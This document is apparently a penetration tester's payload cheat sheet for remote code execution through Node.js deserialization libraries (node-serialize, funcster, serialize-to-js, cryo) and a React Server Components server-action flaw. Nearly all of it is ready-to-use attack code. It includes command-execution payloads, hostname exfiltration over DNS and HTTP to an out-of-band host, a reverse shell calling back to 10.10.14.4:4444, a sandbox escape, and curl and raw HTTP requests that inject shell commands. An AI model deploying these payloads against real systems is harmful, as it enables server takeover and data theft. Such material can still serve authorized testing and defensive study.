# Node.js deserializer payload bodies — Open WHEN: you have fingerprinted a Node.js deserializer (node-serialize, funcster, serialize-to-js, cryo, or an RSC server-action endpoint) and need the exact function-revival body

JS has no PHP/Python-style magic constructors, but several libraries revive
*functions* from serialized text and then `eval` them. The self-executing
trailing `()` is what turns a stored function into RCE on `unserialize`.

## node-serialize — variants beyond the body's one-liner
The body already shows the basic `_$$ND_FUNC$$_function(){...}()` form. Extra
shapes worth trying when the basic one is filtered or the value is nested:
```json
{"a":"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()"}
```
DNS/HTTP OAST (quiet) instead of a shell — exfil hostname in the subdomain:
```json
{"x":"_$$ND_FUNC$$_function(){require('dns').lookup(require('os').hostname()+'.$RAND.oast.live',()=>{})}()"}
```
Reverse shell body (drop into the `_$$ND_FUNC$$_` slot, keep trailing `()`):
```javascript
function(){var n=require('net'),c=require('child_process'),s=new n.Socket();
s.connect(4444,'10.10.14.4',function(){var sh=c.spawn('/bin/sh',[]);
s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);});}()
```
Function-free form (library still `eval`s the post-flag string directly):
```json
{"rce":"_$$ND_FUNC$$_require('child_process').execSync('curl http://$RAND.oast.live/$(hostname)')"}
```

## funcster — escape the sandbox via constructor chain
funcster hides built-ins, so `require`/`console` throw `ReferenceError`. Reach
the real global through `this.constructor.constructor` (Function ctor), then
self-execute. Key name is `__js_function`:
```javascript
// fires on deepDeserialize() — trailing () auto-runs
{ __js_function: 'function(){return "x"}()' }                       // proves exec
{ __js_function: 'this.constructor.constructor("console.log(1111)")()' }
{ __js_function: 'this.constructor.constructor("return require(\'child_process\').execSync(\'id\').toString()")()' }
```
DNS oracle through the same escape:
```javascript
{ __js_function: 'this.constructor.constructor("require(\'dns\').lookup(\'$RAND.oast.live\',()=>{})")()' }
```

## serialize-javascript / serialize-to-js — eval-on-deserialize
`serialize-javascript` only serializes; the app usually deserializes with the
documented `eval("(" + data + ")")`. Feed a self-executing function string:
```javascript
// value placed where the app does eval("("+input+")")
function(){ require('child_process').execSync('curl http://$RAND.oast.live'); }()
```
`serialize-to-js` revives functions/regex; an IIFE in a function-valued field
runs on `deserialize()`:
```javascript
{ foo: function(){ require('child_process').execSync('id'); }() }
```

## cryo — function reconstruction
`cryo.parse()` rebuilds functions from its custom format; same IIFE pattern —
serialize a known function locally, then append `()` inside the encoded value
so it self-executes on parse. (Confirmed RCE primitive per HackerOne #350418.)

## React Server Components — decodeAction abuse (CVE-2025-55182)
`react-server-dom-webpack` 19.2.0 `decodeAction()` trusts the multipart `id`
(module#export) and `bound` (args) — invoke ANY exported server action with
chosen arguments, no React client needed. Inject a shell metacharacter into a
`bound` arg that lands in a `child_process` call:
```bash
curl -sk -X POST http://target/formaction \
  -F '$ACTION_REF_0=' \
  -F '$ACTION_0:0={"id":"app/server-actions#generateReport","bound":["acme","pdf & whoami"]}'
```
Raw multipart equivalent (when curl `-F` quoting fights you):
```http
POST /formaction HTTP/1.1
Content-Type: multipart/form-data; boundary=----B

------B
Content-Disposition: form-data; name="$ACTION_REF_0"

------B
Content-Disposition: form-data; name="$ACTION_0:0"

{"id":"app/server-actions#generateReport","bound":["acme","pdf & whoami"]}
------B--
```
Recon the `id` from bundle output / error traces / leaked manifests (strings
like `app/server-actions#<export>`). Command output returns in the JSON body.

## "magic" callback hooks usable as chain triggers
Even without a function-reviving library, deserialized objects get coerced
through `toString`, `valueOf`, `toJSON` on use — and a returned object with a
function-typed `then` property is auto-invoked as a thenable inside any async
resolution. Combine with prototype pollution to plant these on `Object.prototype`.
